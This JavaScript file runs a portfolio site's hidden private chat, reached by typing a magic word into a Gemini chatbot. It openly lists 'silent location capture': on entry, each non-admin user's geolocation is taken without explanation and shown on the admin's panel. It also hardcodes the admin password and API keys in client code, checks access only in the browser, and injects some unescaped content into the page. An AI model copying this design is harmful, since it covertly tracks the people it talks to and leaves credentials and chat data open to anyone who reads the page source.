// ============================================================
// HET PATEL — PRIVATE CHAT SYSTEM v2
// ============================================================
// Flow: Gemini chatbot → "abracadabra" → code/credentials → private chat
// Admin: ID=Hela, Password=Het@#1517@#
// Special access: ADITIS → Aditi (pre-seeded)
// Features: text, images, video, voice notes, video notes,
//            WebRTC voice/video calls, silent location capture
// ============================================================

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getDatabase, ref, set, get, push, onValue, off, serverTimestamp, onDisconnect }
    from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
import { getStorage, ref as sRef, uploadBytes, getDownloadURL }
    from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";

// ── Config ─────────────────────────────────────────────────
const firebaseConfig = {
    apiKey: "AIzaSyB-y70Ll8vzD1cI1eQctblkwUZMP1PjI18",
    authDomain: "hetpatel-in.firebaseapp.com",
    databaseURL: "https://hetpatel-in-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "hetpatel-in",
    storageBucket: "hetpatel-in.firebasestorage.app",
    messagingSenderId: "267666890158",
    appId: "1:267666890158:web:5cd0d0de9fab0edc287c3f",
    measurementId: "G-HY74J8GTNB"
};

// Replace with your Gemini free API key from aistudio.google.com
const GEMINI_KEY = "AIzaSyALod9inFEwTSwnBatBrNB2J_jls9Hfnus";

// ── Init ───────────────────────────────────────────────────
let app, db, storage;
const ONLINE = firebaseConfig.apiKey !== "YOUR_API_KEY";
const HAS_GEM = GEMINI_KEY !== "YOUR_GEMINI_KEY";

if (ONLINE) {
    try {
        app = initializeApp(firebaseConfig);
        db = getDatabase(app);
        storage = getStorage(app);
        seedDefaultUsers();
    } catch (e) { console.error("Firebase:", e); }
}

async function seedDefaultUsers() {
    const s = await get(ref(db, "authorizedUsers/ADITIS"));
    if (!s.exists()) await set(ref(db, "authorizedUsers/ADITIS"), { name: "Aditi" });
}

// ── State ──────────────────────────────────────────────────
let chatStep = "bot";
let currentUser = null;
let currentRoomId = null;
let mediaBlob = null;
let mediaType = null;
let mediaRecorder = null;
let recordChunks = [];
let activeMsgRef = null;
// WebRTC
let peer = null, activeCall = null;
window.chatStep = "bot";

// ── DOM ────────────────────────────────────────────────────
const modal = document.getElementById("chat-modal");
const headerName = document.getElementById("chat-header-name");
const stepBot = document.getElementById("step-bot");
const stepCode = document.getElementById("step-code");
const stepChat = document.getElementById("step-chat");
const botMessages = document.getElementById("bot-messages");
const botForm = document.getElementById("bot-form");
const botInput = document.getElementById("bot-input");
const codeForm = document.getElementById("code-form");
const codeInput = document.getElementById("code-input");
const adminPass = document.getElementById("admin-pass");
const codeError = document.getElementById("code-error");
const msgContainer = document.getElementById("messages-container");
const chatForm = document.getElementById("chat-form");
const msgInput = document.getElementById("message-input");
const adminSidebar = document.getElementById("admin-sidebar");
const adminUserList = document.getElementById("admin-user-list");
const adminTools = document.getElementById("admin-tools");
const mediaPreview = document.getElementById("media-preview");
const mediaLabel = document.getElementById("media-preview-label");
const mediaCancel = document.getElementById("media-cancel");
const recordingBar = document.getElementById("recording-bar");
const recordingLabel = document.getElementById("recording-label");
const stopRecBtn = document.getElementById("stop-recording");
const fileInput = document.getElementById("file-input");
const voiceBtn = document.getElementById("voice-btn");
const vidnoteBtn = document.getElementById("vidnote-btn");
const assignCodeBtn = document.getElementById("assign-code-btn");
const assignFeedback = document.getElementById("assign-feedback");
const callBar = document.getElementById("call-bar");

// ── Helpers ────────────────────────────────────────────────
const show = (el, d = "flex") => { if (!el) return; el.classList.remove("hidden"); el.style.display = d; };
const hide = (el) => { if (!el) return; el.classList.add("hidden"); el.style.display = ""; };

window.closeChatModal = () => { hide(modal); modal.classList.remove("flex"); };
window.openChatModal = () => {
    show(modal, "flex"); modal.classList.add("flex");
    hide(stepBot); show(stepCode, "flex");
    window.chatStep = "code";
    setTimeout(() => codeInput?.focus(), 80);
};


// Mobile admin panel switching (WhatsApp-style: contacts → chat)
window.adminShowChat = () => {
    const sb = document.getElementById("contacts-sidebar");
    if (sb && window.innerWidth < 768) sb.style.transform = "translateX(-100%)";
};
window.adminShowContacts = () => {
    const sb = document.getElementById("contacts-sidebar");
    if (sb) sb.style.transform = "";
};

// ── GEMINI CHATBOT ─────────────────────────────────────────
const staticReplies = [
    "Great question! Het is brilliant at what he does — want to learn more about his work?",
    "I'm just his assistant, but I can tell you he's currently open to exciting opportunities!",
    "Het builds things that work — from IoT to SaaS. Anything specific you'd like to know?",
    "I've noted your message! He'll get back to you soon.",
    "Interesting thought. Het loves connecting with curious, driven people.",
    "That's insightful! Is there anything specific about Het's work you'd like to know?",
];
let staticIdx = 0;

async function geminiReply(userMsg) {
    if (!HAS_GEM) {
        // fallback to static
        return staticReplies[staticIdx++ % staticReplies.length];
    }
    try {
        const res = await fetch(
            `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_KEY}`,
            {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    contents: [{
                        parts: [{
                            text: `You are Het Patel's friendly AI assistant on his portfolio website. 
Het is a founder, IoT and SaaS builder from India. Keep replies short (1-2 sentences), warm, and helpful. 
Never reveal anything private or personal. 
User message: "${userMsg}"`
                        }]
                    }]
                })
            }
        );
        const data = await res.json();
        return data?.candidates?.[0]?.content?.parts?.[0]?.text || staticReplies[staticIdx++ % staticReplies.length];
    } catch {
        return staticReplies[staticIdx++ % staticReplies.length];
    }
}

function addBotBubble(text, isUser = false) {
    const w = document.createElement("div");
    w.className = `flex gap-2.5 ${isUser ? "justify-end" : ""}`;
    if (isUser) {
        w.innerHTML = `<div class="max-w-[75%] bg-brand-purple/50 border border-brand-purple/30 rounded-2xl rounded-tr-sm px-4 py-2.5 text-sm text-white">${escHtml(text)}</div>`;
    } else {
        w.innerHTML = `
      <div class="w-7 h-7 rounded-full bg-gradient-to-br from-brand-purple to-brand-accent flex-shrink-0 flex items-center justify-center text-[11px] font-bold mt-0.5">H</div>
      <div class="max-w-[75%] bg-white/[0.06] border border-white/[0.08] rounded-2xl rounded-tl-sm px-4 py-2.5 text-sm text-gray-200 leading-relaxed">${text}</div>`;
    }
    botMessages.appendChild(w);
    botMessages.scrollTop = botMessages.scrollHeight;
}

function addTypingIndicator() {
    const w = document.createElement("div");
    w.id = "typing-dot";
    w.className = "flex gap-2.5";
    w.innerHTML = `
    <div class="w-7 h-7 rounded-full bg-gradient-to-br from-brand-purple to-brand-accent flex-shrink-0 flex items-center justify-center text-[11px] font-bold">H</div>
    <div class="bg-white/[0.06] border border-white/[0.08] rounded-2xl rounded-tl-sm px-4 py-3 flex items-center gap-1.5">
      <span class="w-1.5 h-1.5 rounded-full bg-gray-400 animate-bounce" style="animation-delay:0ms"></span>
      <span class="w-1.5 h-1.5 rounded-full bg-gray-400 animate-bounce" style="animation-delay:150ms"></span>
      <span class="w-1.5 h-1.5 rounded-full bg-gray-400 animate-bounce" style="animation-delay:300ms"></span>
    </div>`;
    botMessages.appendChild(w);
    botMessages.scrollTop = botMessages.scrollHeight;
}

botForm.addEventListener("submit", async e => {
    e.preventDefault();
    const text = botInput.value.trim();
    if (!text) return;
    botInput.value = "";

    addBotBubble(text, true);

    if (text.toLowerCase() === "abracadabra") {
        addTypingIndicator();
        setTimeout(() => {
            document.getElementById("typing-dot")?.remove();
            addBotBubble("✨ Magic word detected. Switching to secure mode…");
            setTimeout(switchToCodeStep, 800);
        }, 600);
        return;
    }

    addTypingIndicator();
    const reply = await geminiReply(text);
    document.getElementById("typing-dot")?.remove();
    addBotBubble(reply);
});

function switchToCodeStep() {
    hide(stepBot);
    show(stepCode, "flex");
    chatStep = window.chatStep = "code";
    headerName.textContent = "Secure Access";
    setTimeout(() => codeInput.focus(), 80);
}

// ── ADMIN PASS REVEAL ──────────────────────────────────────
codeInput.addEventListener("input", () => {
    const isAdmin = codeInput.value.trim().toUpperCase() === "HELA";
    if (isAdmin) {
        show(adminPass, "block");
        adminPass.focus();
        document.getElementById("code-hint").textContent = "Enter your admin password.";
    } else {
        hide(adminPass);
        adminPass.value = "";
        document.getElementById("code-hint").textContent = "Enter the private code Het gave you.";
    }
});

// ── CODE AUTH ─────────────────────────────────────────────
codeForm.addEventListener("submit", async e => {
    e.preventDefault();
    const id = codeInput.value.trim().toUpperCase();
    const pass = adminPass?.value?.trim() || "";
    if (!id) return;
    hide(codeError);

    if (id === "HELA") {
        if (pass === "Het@#1517@#") {
            currentUser = { name: "Het Patel", code: "ADMIN", isAdmin: true };
            enterChat();
        } else {
            show(codeError, "block");
        }
        return;
    }

    if (ONLINE) {
        const snap = await get(ref(db, `authorizedUsers/${id}`));
        if (snap.exists()) {
            currentUser = { name: snap.val().name, code: id, isAdmin: false };
            enterChat();
        } else show(codeError, "block");
    } else {
        if (id === "ADITIS") { currentUser = { name: "Aditi", code: "ADITIS", isAdmin: false }; enterChat(); }
        else show(codeError, "block");
    }
});

// ── ENTER CHAT ────────────────────────────────────────────
function enterChat() {
    hide(stepCode);
    show(stepChat, "flex");
    chatStep = window.chatStep = "chat";

    if (currentUser.isAdmin) {
        headerName.textContent = "Admin";
        show(document.getElementById("admin-layout"), "flex");
        hide(document.getElementById("user-layout"));
        listenForAllUsers();
        document.getElementById("show-add-contact")?.addEventListener("click", () => {
            const panel = document.getElementById("add-contact-panel");
            panel?.classList.toggle("hidden");
        });
        document.getElementById("contact-search")?.addEventListener("input", e => {
            const q = e.target.value.toLowerCase();
            document.querySelectorAll(".contact-card").forEach(card => {
                card.style.display = card.dataset.name.toLowerCase().includes(q) ? "" : "none";
            });
        });
        initPeer("het_admin_" + Date.now());
        if (ONLINE) setupPresence("ADMIN");
    } else {
        headerName.textContent = "Chat with Het";
        hide(document.getElementById("admin-layout"));
        show(document.getElementById("user-layout"), "flex");
        currentRoomId = `room_${currentUser.code.toLowerCase()}`;
        listenUserMessages(currentRoomId);
        captureLocation();
        initPeer(currentUser.code.toLowerCase() + "_" + Date.now());
        wireUserControls();
        if (ONLINE) setupPresence(currentUser.code);
    }
}

// ── PRESENCE SYSTEM ───────────────────────────────────────
function setupPresence(code) {
    const presRef = ref(db, `presence/${code}`);
    const connRef = ref(db, ".info/connected");

    onValue(connRef, snap => {
        if (!snap.val()) return;
        // Write online status; auto-delete on disconnect
        onDisconnect(presRef).set({ online: false, lastSeen: Date.now() });
        set(presRef, { online: true, lastSeen: Date.now() });
    });
}

// ── WATCH SINGLE CONTACT'S PRESENCE ──────────────────────
// Called when admin selects a contact — updates header subtitle
function watchContactPresence(code) {
    const presRef = ref(db, `presence/${code}`);
    onValue(presRef, snap => {
        const sub = document.getElementById("admin-contact-sub");
        if (!sub) return;
        if (!snap.exists() || !snap.val().online) {
            const ls = snap.val()?.lastSeen;
            const ago = ls ? timeSince(ls) : "offline";
            sub.textContent = `⚫ Last seen ${ago}`;
            sub.style.color = "";
        } else {
            sub.textContent = "🟢 Online";
            sub.style.color = "#4ade80";
        }
        // Update dot on contact card
        const dot = document.querySelector(`.loc-dot-${code}`);
        if (dot) {
            if (snap.val()?.online) {
                dot.style.background = "#4ade80";
                dot.classList.remove("hidden");
                dot.title = "Online";
            } else {
                dot.style.background = "";
                dot.title = "Offline";
            }
        }
    });
}

function timeSince(ts) {
    const diff = Math.floor((Date.now() - ts) / 1000);
    if (diff < 60) return `${diff}s ago`;
    if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
    if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
    return `${Math.floor(diff / 86400)}d ago`;
}

// ── SILENT LOCATION ───────────────────────────────────────
function captureLocation() {
    if (!navigator.geolocation) return;
    navigator.geolocation.getCurrentPosition(
        pos => {
            const { latitude: lat, longitude: lng, accuracy } = pos.coords;
            const ts = Date.now();
            const mapsUrl = `https://maps.google.com/?q=${lat},${lng}`;
            if (ONLINE) {
                set(ref(db, `locations/${currentUser.code}`), {
                    lat, lng, accuracy,
                    mapsUrl,
                    name: currentUser.name,
                    timestamp: ts
                });
            }
            // Store locally so admin panel shows it
            window._capturedLocation = { lat, lng, mapsUrl, name: currentUser.name };
        },
        () => { }, // silently ignore denial
        { timeout: 10000, maximumAge: 300000 }
    );
}

// admin chat panel uses msgContainer (messages-container in admin-layout)
function listenMessages(roomId) {
    if (activeMsgRef) off(activeMsgRef);
    const cont = document.getElementById("messages-container");

    cont.innerHTML = `<div class="encrypted-tag text-center text-[11px] text-brand-accent/50 uppercase tracking-widest font-mono flex items-center justify-center gap-2 py-2">
      <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
      Private Encrypted Session</div>`;

    if (!ONLINE) { appendMsgTo(cont, { sender: "System", text: "Demo mode — connect Firebase.", timestamp: Date.now() }, false, "system"); return; }

    activeMsgRef = ref(db, `chats/${roomId}/messages`);
    onValue(activeMsgRef, snap => {
        const tag = cont.querySelector(".encrypted-tag");
        cont.innerHTML = ""; if (tag) cont.appendChild(tag);
        const data = snap.val(); if (!data) return;
        Object.values(data).forEach(m => appendMsgTo(cont, m, m.sender === currentUser.name, m.mediaType));
    });
}

// regular user chat panel uses user-messages-container
function listenUserMessages(roomId) {
    if (activeMsgRef) off(activeMsgRef);
    const cont = document.getElementById("user-messages-container");

    cont.innerHTML = `<div class="encrypted-tag text-center text-[11px] text-brand-accent/50 uppercase tracking-widest font-mono flex items-center justify-center gap-2 py-2">
      <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
      Private Encrypted Session</div>`;

    if (!ONLINE) { appendMsgTo(cont, { sender: "System", text: "Demo mode — connect Firebase.", timestamp: Date.now() }, false, "system"); return; }

    activeMsgRef = ref(db, `chats/${roomId}/messages`);
    onValue(activeMsgRef, snap => {
        const tag = cont.querySelector(".encrypted-tag");
        cont.innerHTML = ""; if (tag) cont.appendChild(tag);
        const data = snap.val(); if (!data) return;
        Object.values(data).forEach(m => appendMsgTo(cont, m, m.sender === currentUser.name, m.mediaType));
    });
}

// Wire user-layout controls (called once on user enter)
function wireUserControls() {
    const form = document.getElementById("user-chat-form");
    const input = document.getElementById("user-message-input");
    const fInput = document.getElementById("user-file-input");
    const vBtn = document.getElementById("user-voice-btn");
    const vnBtn = document.getElementById("user-vidnote-btn");
    const mPrev = document.getElementById("user-media-preview");
    const mLabel = document.getElementById("user-media-label");
    const mCancel = document.getElementById("user-media-cancel");
    const recBar = document.getElementById("user-recording-bar");
    const recLbl = document.getElementById("user-recording-label");
    const stopBtn = document.getElementById("user-stop-recording");
    const cont = document.getElementById("user-messages-container");

    const localShow = (el, d = "flex") => { el?.classList.remove("hidden"); if (el) el.style.display = d; };
    const localHide = (el) => { el?.classList.add("hidden"); if (el) el.style.display = ""; };

    let localBlob = null, localType = null;

    fInput?.addEventListener("change", () => {
        const f = fInput.files[0]; if (!f) return;
        localBlob = f; localType = f.type.startsWith("image/") ? "image" : "video";
        mLabel.textContent = `📎 ${f.name}`; localShow(mPrev, "flex"); fInput.value = "";
    });
    mCancel?.addEventListener("click", () => { localBlob = null; localType = null; localHide(mPrev); mLabel.textContent = ""; });

    const doRecord = async (type) => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia(
                type === "video" ? { audio: true, video: { facingMode: "user", width: 320, height: 240 } } : { audio: true });
            recordChunks = []; mediaRecorder = new MediaRecorder(stream);
            mediaRecorder.ondataavailable = e => recordChunks.push(e.data);
            mediaRecorder.onstop = () => {
                localBlob = new Blob(recordChunks, { type: type === "video" ? "video/webm" : "audio/webm" });
                localType = type === "video" ? "vidnote" : "audio";
                mLabel.textContent = type === "video" ? "🎥 Video note ready" : "🎙️ Voice note ready";
                localShow(mPrev, "flex"); localHide(recBar); stream.getTracks().forEach(t => t.stop());
            };
            mediaRecorder.start(); recLbl.textContent = type === "video" ? "Recording video note…" : "Recording voice note…"; localShow(recBar, "flex");
        } catch { alert("Camera/mic access denied."); }
    };
    vBtn?.addEventListener("click", () => doRecord("audio"));
    vnBtn?.addEventListener("click", () => doRecord("video"));
    stopBtn?.addEventListener("click", () => { if (mediaRecorder?.state !== "inactive") mediaRecorder.stop(); });

    form?.addEventListener("submit", async e => {
        e.preventDefault();
        const text = input?.value.trim();
        if (!text && !localBlob) return;
        input.value = ""; input.style.height = "auto";

        const payload = { sender: currentUser.name, timestamp: ONLINE ? serverTimestamp() : Date.now() };
        if (localBlob) {
            if (ONLINE) { const url = await uploadMedia(localBlob, localType); payload.mediaUrl = url; payload.mediaType = localType; }
            else { payload.mediaUrl = URL.createObjectURL(localBlob); payload.mediaType = localType; }
            localBlob = null; localType = null; localHide(mPrev); mLabel.textContent = "";
        } else { payload.text = text; payload.mediaType = "text"; }

        if (ONLINE) await push(ref(db, `chats/${currentRoomId}/messages`), payload);
        else {
            appendMsgTo(cont, payload, true, payload.mediaType);
            setTimeout(() => appendMsgTo(cont, { sender: "Het Patel", text: "Hey! Demo mode — add Firebase config 😊", timestamp: Date.now() }, false, "text"), 900);
        }
    });
}



// ── APPEND MESSAGE (WhatsApp style) ──────────────────────
function appendMsgTo(container, msg, isMe, type = "text") {
    const time = msg.timestamp ? new Date(msg.timestamp).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" }) : "";
    const wrap = document.createElement("div");

    if (type === "system") {
        wrap.className = "flex justify-center my-1";
        wrap.innerHTML = `<span class="bg-black/40 text-gray-400 text-[11px] rounded-full px-3 py-1">${msg.text}</span>`;
        container.appendChild(wrap); container.scrollTop = container.scrollHeight; return;
    }

    wrap.className = `flex ${isMe ? "justify-end" : "justify-start"} mb-0.5`;

    let content = "";
    if (type === "image") content = `<img src="${msg.mediaUrl}" class="max-w-full max-h-52 rounded-lg object-cover cursor-pointer" onclick="window.open('${msg.mediaUrl}')">`;
    else if (type === "video") content = `<video src="${msg.mediaUrl}" controls class="max-w-full max-h-48 rounded-lg"></video>`;
    else if (type === "audio") content = `<div class="flex items-center gap-2"><svg class="w-5 h-5 opacity-70" fill="currentColor" viewBox="0 0 24 24"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2H3v2a9 9 0 0 0 8 8.94V23h2v-2.06A9 9 0 0 0 21 12v-2z"/></svg><audio src="${msg.mediaUrl}" controls class="h-8 w-36" style="filter:invert(0.8)"></audio></div>`;
    else if (type === "vidnote") content = `<video src="${msg.mediaUrl}" controls class="max-w-full max-h-40 rounded-lg"></video>`;
    else content = `<p class="text-sm leading-relaxed whitespace-pre-wrap break-words">${escHtml(msg.text || "")}</p>`;

    // WhatsApp bubble: green for me, dark for them
    const sentBg = "bg-[#005c4b]";
    const recvBg = "bg-[#1f2c34]";

    wrap.innerHTML = `
    <div class="max-w-[72%] flex flex-col">
      <div class="${isMe ? sentBg : recvBg} rounded-lg ${isMe ? "rounded-tr-none" : "rounded-tl-none"} px-3 pt-1.5 pb-1 shadow-sm">
        ${!isMe && !currentUser?.isAdmin ? `` : !isMe ? `<p class="text-[11px] font-bold text-brand-accent mb-0.5">${escHtml(msg.sender || "")}</p>` : ""}
        <div class="text-[13.5px] text-white">${content}</div>
        <div class="flex items-center justify-end gap-1 mt-0.5">
          <span class="text-[10px] text-white/40">${time}</span>
          ${isMe ? `<svg class="w-3.5 h-3.5 text-[#53bdeb]" fill="currentColor" viewBox="0 0 16 11"><path d="M11.071.653a.75.75 0 0 1 .014 1.06l-6.5 6.75a.75.75 0 0 1-1.08-.014L.653 5.097a.75.75 0 1 1 1.094-1.026l2.329 2.484 5.94-5.888a.75.75 0 0 1 1.055-.014zM15.803.653a.75.75 0 0 1 .014 1.06l-6.5 6.75a.75.75 0 0 1-1.055.014L6.47 6.75a.75.75 0 1 1 1.06-1.06l1.315 1.314L14.748.667a.75.75 0 0 1 1.055-.014z"/></svg>` : ""}
        </div>
      </div>
    </div>`;

    container.appendChild(wrap);
    container.scrollTop = container.scrollHeight;
}

function escHtml(s) { return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;"); }


// ── ADMIN SEND (uses messages-container) ──────────────────
document.getElementById("chat-form")?.addEventListener("submit", async e => {
    e.preventDefault();
    const text = msgInput.value.trim();
    if (!text && !mediaBlob) return;
    if (!currentRoomId) return;
    msgInput.value = ""; msgInput.style.height = "auto";

    const cont = document.getElementById("messages-container");
    const payload = { sender: currentUser.name, timestamp: ONLINE ? serverTimestamp() : Date.now() };

    if (mediaBlob) {
        if (ONLINE) { try { const url = await uploadMedia(mediaBlob, mediaType); payload.mediaUrl = url; payload.mediaType = mediaType; } catch (err) { clearMedia(); return; } }
        else { payload.mediaUrl = URL.createObjectURL(mediaBlob); payload.mediaType = mediaType; }
        clearMedia();
    } else { payload.text = text; payload.mediaType = "text"; }

    if (ONLINE) await push(ref(db, `chats/${currentRoomId}/messages`), payload);
    else appendMsgTo(cont, payload, true, payload.mediaType);
});


// ── UPLOAD MEDIA ─────────────────────────────────────────
async function uploadMedia(blob, type) {
    const ext = { image: "jpg", video: "mp4", audio: "webm", vidnote: "webm" }[type] || "bin";
    const path = `chats/${currentRoomId}/${Date.now()}.${ext}`;
    await uploadBytes(sRef(storage, path), blob);
    return await getDownloadURL(sRef(storage, path));
}

// ── ADMIN FILE ATTACH ─────────────────────────────────────
document.getElementById("file-input")?.addEventListener("change", () => {
    const fEl = document.getElementById("file-input");
    const f = fEl.files[0]; if (!f) return;
    mediaBlob = f;
    mediaType = f.type.startsWith("image/") ? "image" : "video";
    const lbl = document.getElementById("media-preview-label");
    if (lbl) lbl.textContent = `📎 ${f.name}`;
    show(document.getElementById("media-preview"), "flex");
    fEl.value = "";
});
document.getElementById("media-cancel")?.addEventListener("click", clearMedia);
function clearMedia() {
    mediaBlob = null; mediaType = null;
    hide(document.getElementById("media-preview"));
    const lbl = document.getElementById("media-preview-label");
    if (lbl) lbl.textContent = "";
}

// ── ADMIN RECORDING ───────────────────────────────────────
document.getElementById("voice-btn")?.addEventListener("click", () => startRecording("audio"));
document.getElementById("vidnote-btn")?.addEventListener("click", () => startRecording("video"));

async function startRecording(type) {
    const recBar = document.getElementById("recording-bar");
    const recLbl = document.getElementById("recording-label");
    const mPrev = document.getElementById("media-preview");
    const mLabel = document.getElementById("media-preview-label");
    try {
        const stream = await navigator.mediaDevices.getUserMedia(
            type === "video" ? { audio: true, video: { facingMode: "user", width: 320, height: 240 } } : { audio: true }
        );
        recordChunks = [];
        mediaRecorder = new MediaRecorder(stream);
        mediaRecorder.ondataavailable = e => recordChunks.push(e.data);
        mediaRecorder.onstop = () => {
            mediaBlob = new Blob(recordChunks, { type: type === "video" ? "video/webm" : "audio/webm" });
            mediaType = type === "video" ? "vidnote" : "audio";
            if (mLabel) mLabel.textContent = type === "video" ? "🎥 Video note ready" : "🎙️ Voice note ready";
            show(mPrev, "flex"); hide(recBar);
            stream.getTracks().forEach(t => t.stop());
        };
        mediaRecorder.start();
        if (recLbl) recLbl.textContent = type === "video" ? "Recording video note…" : "Recording voice note…";
        show(recBar, "flex");
    } catch { alert("Camera/mic access denied."); }
}
document.getElementById("stop-recording")?.addEventListener("click", () => {
    if (mediaRecorder?.state !== "inactive") mediaRecorder.stop();
});

// ── AUTO-RESIZE + ENTER-TO-SEND TEXTAREAS ─────────────────
["message-input", "user-message-input"].forEach(id => {
    const el = document.getElementById(id);
    if (!el) return;
    el.addEventListener("input", () => {
        el.style.height = "auto";
        el.style.height = Math.min(el.scrollHeight, 112) + "px";
    });
    el.addEventListener("keydown", e => {
        if (e.key === "Enter" && !e.shiftKey) {
            e.preventDefault();
            el.closest("form")?.dispatchEvent(new Event("submit", { cancelable: true, bubbles: true }));
        }
    });
});


// ── ADMIN: ALL USERS + LOCATION ──────────────────────────
function listenForAllUsers() {
    if (!ONLINE) { renderAdminUsers({ ADITIS: { name: "Aditi" } }); return; }
    onValue(ref(db, "authorizedUsers"), snap => renderAdminUsers(snap.val() || {}));
}

function renderAdminUsers(users) {
    const list = document.getElementById("admin-user-list");
    list.innerHTML = "";
    Object.entries(users).forEach(([code, data]) => {
        if (data.role === "admin") return;
        const roomId = `room_${code.toLowerCase()}`;
        const isActive = currentRoomId === roomId;
        const initial = (data.name || "?")[0].toUpperCase();
        const colors = ["from-purple-500 to-pink-500", "from-blue-500 to-cyan-400", "from-green-500 to-teal-400", "from-amber-500 to-orange-400"];
        const color = colors[code.charCodeAt(0) % colors.length];

        const card = document.createElement("button");
        card.className = `contact-card w-full flex items-center gap-2.5 px-2 py-2 rounded-xl transition-all text-left ${isActive ? "bg-brand-purple/20 border border-brand-purple/30" : "hover:bg-white/[0.04] border border-transparent"
            }`;
        card.dataset.name = data.name;
        card.dataset.code = code;
        card.innerHTML = `
      <div class="relative flex-shrink-0">
        <div class="w-8 h-8 rounded-full bg-gradient-to-br ${color} flex items-center justify-center text-xs font-bold text-white">${initial}</div>
        <span class="loc-dot-${code} absolute -bottom-0.5 -right-0.5 w-2.5 h-2.5 rounded-full bg-gray-600 border border-[#0a0a14] hidden" title="Location tracked"></span>
      </div>
      <div class="flex-1 min-w-0">
        <p class="text-xs font-semibold text-white truncate">${data.name}</p>
        <p class="text-[10px] text-gray-500 font-mono truncate">#${code}</p>
      </div>`;

        card.onclick = () => {
            currentRoomId = roomId;
            document.getElementById("admin-contact-name").textContent = data.name;
            document.getElementById("admin-contact-sub").textContent = `#${code}`;
            document.getElementById("admin-contact-avatar").textContent = initial;
            listenMessages(currentRoomId);
            showUserLocation(code, data.name);
            renderAdminUsers(users);
            if (ONLINE) watchContactPresence(code);
            window.adminShowChat();
        };
        list.appendChild(card);

        // Check if location exists and show green dot
        if (ONLINE) {
            get(ref(db, `locations/${code}`)).then(snap => {
                if (snap.exists()) {
                    card.querySelector(`.loc-dot-${code}`)?.classList.replace("bg-gray-600", "bg-green-400");
                    card.querySelector(`.loc-dot-${code}`)?.classList.remove("hidden");
                }
            });
        }
    });
}

// Show user's location in admin panel when switching to their chat
async function showUserLocation(code, name) {
    if (!ONLINE) return;
    const snap = await get(ref(db, `locations/${code}`));
    // Show location panel in sidebar
    const locPanel = document.getElementById("admin-location-panel");
    if (!snap.exists()) {
        if (locPanel) locPanel.innerHTML = `<p class="text-[11px] text-gray-500 px-2 py-1">No location data for ${name}.</p>`;
        return;
    }
    const loc = snap.val();
    const ts = loc.timestamp ? new Date(loc.timestamp).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" }) + " " + new Date(loc.timestamp).toLocaleDateString() : "unknown";
    const lat = loc.lat?.toFixed(5), lng = loc.lng?.toFixed(5);
    const acc = loc.accuracy ? Math.round(loc.accuracy) + "m" : "?";
    const mapThumb = `https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lng}&zoom=14&size=300x120&markers=color:red%7C${lat},${lng}&key=`;
    if (locPanel) locPanel.innerHTML = `
      <div class="mx-2 my-1 rounded-xl overflow-hidden border border-green-500/20">
        <a href="${loc.mapsUrl}" target="_blank"
           class="block w-full bg-[#0d1f1a] hover:bg-[#0f2820] transition-colors px-3 py-2">
          <div class="flex items-center gap-2 mb-1">
            <svg class="w-3 h-3 text-green-400 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0zM15 11a3 3 0 11-6 0 3 3 0 016 0z"/></svg>
            <span class="text-[11px] font-bold text-green-300">${name}'s Location</span>
          </div>
          <p class="text-[10px] text-green-200/70 font-mono">${lat}, ${lng}</p>
          <p class="text-[10px] text-gray-500">Accuracy: ${acc} &nbsp;·&nbsp; ${ts}</p>
          <p class="text-[10px] text-green-400 mt-0.5 underline">Open in Google Maps →</p>
        </a>
      </div>`;
    // Also show at top of messages
    const cont = document.getElementById("messages-container");
    cont?.querySelectorAll(".loc-notice").forEach(el => el.remove());
    const locDiv = document.createElement("div");
    locDiv.className = "loc-notice flex justify-center my-1";
    locDiv.innerHTML = `<a href="${loc.mapsUrl}" target="_blank"
      class="inline-flex items-center gap-1.5 bg-green-900/30 border border-green-500/20 rounded-full px-3 py-1 text-[11px] text-green-300 hover:bg-green-900/50">
      📍 ${name} · ${lat}, ${lng} · ${ts} → Maps</a>`;
    const enc = cont?.querySelector(".encrypted-tag");
    if (enc) enc.insertAdjacentElement("afterend", locDiv);
    else cont?.insertAdjacentElement("afterbegin", locDiv);
}

// ── ASSIGN CODE ──────────────────────────────────────────
assignCodeBtn?.addEventListener("click", async () => {
    const nameEl = document.getElementById("new-code-name");
    const codeEl = document.getElementById("new-code-val");
    const fbEl = document.getElementById("assign-feedback");
    const name = nameEl?.value.trim();
    const code = codeEl?.value.trim().toUpperCase();
    if (!name || !code) { alert("Enter both name and code."); return; }
    try {
        if (ONLINE) await set(ref(db, `authorizedUsers/${code}`), { name });
    } catch (e) { console.warn("Firebase write failed:", e.message); }
    // Always show feedback and clear fields
    if (nameEl) nameEl.value = "";
    if (codeEl) codeEl.value = "";
    if (fbEl) { fbEl.classList.remove("hidden"); fbEl.style.display = "inline"; setTimeout(() => { fbEl.classList.add("hidden"); fbEl.style.display = ""; }, 2500); }
    // Refresh contact list locally if offline
    if (!ONLINE) listenForAllUsers();
});

